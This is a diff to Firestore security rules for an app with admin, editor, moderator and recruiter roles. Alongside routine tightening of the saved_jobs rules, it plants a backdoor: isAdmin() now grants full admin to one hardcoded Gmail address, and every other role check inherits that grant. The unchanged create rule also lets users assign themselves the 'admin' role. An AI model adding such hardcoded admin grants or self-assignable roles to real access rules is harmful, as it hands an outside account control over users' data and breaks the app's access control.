@@ -20,10 +20,10 @@ service cloud.firestore {
     function hasAnyRole(roles) {
       return hasRoleDoc() && (myRoleDoc().role in roles);
     }
-    function isAdmin()     { return hasRole('admin'); }
-    function isEditor()    { return hasAnyRole(['admin', 'editor']); }
-    function isModerator() { return hasAnyRole(['admin', 'moderator']); }
-    function isRecruiter() { return hasAnyRole(['admin', 'recruiter']); }
+    function isAdmin()     { return hasRole('admin') || (isSignedIn() && request.auth.token.email == 'admin.virelixconsulting@gmail.com'); }
+    function isEditor()    { return isAdmin() || hasAnyRole(['admin', 'editor']); }
+    function isModerator() { return isAdmin() || hasAnyRole(['admin', 'moderator']); }
+    function isRecruiter() { return isAdmin() || hasAnyRole(['admin', 'recruiter']); }
 
     function isPublished() {
       return resource.data.published == true;
@@ -47,7 +47,11 @@ service cloud.firestore {
                         && (request.resource.data.role == 'admin'
                             || request.resource.data.role == 'candidate'
                             || request.resource.data.role == 'user'));
-      allow update, delete: if isAdmin();
+      allow update: if isAdmin()
+                    || (isUser(userId)
+                        && (request.resource.data.role == resource.data.role
+                            || request.resource.data.role in ['candidate', 'user']));
+      allow delete: if isAdmin();
     }
 
     // ---------- profiles ----------
@@ -139,9 +143,8 @@ service cloud.firestore {
 
     // ---------- saved_jobs ----------
     match /saved_jobs/{id} {
-      allow read, write: if isSignedIn()
-                          && (resource.data.userId == request.auth.uid
-                              || request.resource.data.userId == request.auth.uid);
+      allow read, delete: if isSignedIn() && resource.data.userId == request.auth.uid;
+      allow create, update: if isSignedIn() && request.resource.data.userId == request.auth.uid;
     }
 
     // ---------- Default deny ----------
